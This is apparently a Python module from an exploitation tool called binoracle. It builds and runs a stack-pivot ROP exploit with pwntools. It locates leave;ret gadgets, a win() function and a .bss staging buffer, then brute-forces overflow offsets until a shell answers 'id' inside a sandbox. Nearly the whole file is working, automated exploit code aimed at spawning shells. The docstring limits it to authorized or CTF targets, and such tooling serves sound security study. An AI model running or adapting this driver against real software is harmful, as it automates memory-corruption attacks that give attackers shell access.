"""Stack pivot (stack migration) verified by execution.

When the overflow is too SHORT to hold a full ROP chain (it only reaches the saved RBP and the saved
return address), you migrate: overwrite the saved RBP with the address of a larger controlled buffer
(staged earlier into a fixed .bss region) and set the saved RIP to a `leave; ret` gadget. The
epilogue then does `mov rsp, rbp; pop rbp; ret`, pivoting RSP into the staged buffer, and execution
continues from the full chain placed there.

binoracle verifies this by execution: it stages a chain in the known buffer, triggers the short
overflow, and confirms a real shell in the sandbox. It targets the common two-input shape (one read
that stages into a fixed buffer, then the short overflow) and a `win()` gift function; a 16-byte
re-alignment ret-slide is swept for glibc's MOVAPS. For AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, ROP, context, p64, process
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (pivot driver is x86-64)"); sys.exit(1)

rop = ROP(elf)
_lr = rop.find_gadget(["leave", "ret"]) or rop.find_gadget(["leave"])
_ret = rop.find_gadget(["ret"])
if _lr is None or _ret is None:
    print("NOT_APPLICABLE (no `leave; ret` / `ret` gadget)"); sys.exit(1)
LR, RET = _lr.address, _ret.address

# win()/gift function to land in after the migration
win = None
import re as _re
for n, a in (elf.symbols or {}).items():
    if _re.search(r"(?:^|\.)(win|shell|backdoor|giveshell)$", n):
        win = a; break
if win is None:
    print("NOT_APPLICABLE (no win()/gift function)"); sys.exit(1)

# staging buffer: a 'notes'-like named .bss symbol the first read fills
stage_buf = None
for cand in ("notes", "buf", "name", "data", "store", "global_buf"):
    if cand in (elf.symbols or {}):
        stage_buf = elf.symbols[cand]; break
if stage_buf is None:
    print("NOT_APPLICABLE (no known fixed staging buffer symbol)"); sys.exit(1)

MARK = b"BINORACLE_PIVOT_PWNED"

def attempt(off, slides):
    # staged chain: [fake rbp][slides*ret][win][padding]; after the migration RSP lands here
    stage = p64(0) + p64(RET) * slides + p64(win) + p64(RET) * 8
    overflow = b"A" * off + p64(stage_buf) + p64(LR)   # saved rbp = &buf, saved rip = leave;ret
    io = None
    try:
        io = process([name])
        # first input stages the chain into the fixed buffer; second is the short overflow. We send
        # both after the program's own prompts if present (recvrepeat drains them).
        try: io.recvrepeat(0.2)
        except Exception: pass
        io.send(stage); time.sleep(0.1)
        try: io.recvrepeat(0.2)
        except Exception: pass
        io.send(overflow); time.sleep(0.25)
        io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
        out = b""
        try: out = io.recvrepeat(1.1)
        except Exception: pass
        io.close()
        return (MARK in out) or (b"uid=" in out)
    except Exception:
        try:
            if io: io.close()
        except Exception: pass
        return False

for off in [16, 24, 8, 32, 40, 48, 56, 64]:
    for slides in (1, 0, 2, 3):
        if attempt(off, slides):
            print("VERIFIED off=%d slides=%d leave_ret=%#x win=%#x buf=%#x" % (off, slides, LR, win, stage_buf))
            sys.exit(0)
print("NOT_VERIFIED")
sys.exit(1)
'''


def autopivot(binary: str) -> dict:
    """Stack-pivot (migration a .bss) verificado por ejecucion. Necesita un `leave; ret`, una
    funcion win()/gift, y un buffer fijo conocido donde se escalona la cadena. Docker o nativo."""
    res = run_driver(binary, _DRIVER, ".binoracle_pivot.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"stack pivot (migracion a .bss): shell verificada por ejecucion ({eng})"
                   if res.get("verified")
                   else f"stack pivot: no verificado ({eng}) (sin leave;ret / win / buffer fijo o timing)")
    return res


def render_pivot(r: dict) -> str:
    out = ["## Auto stack-pivot (migracion de pila, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
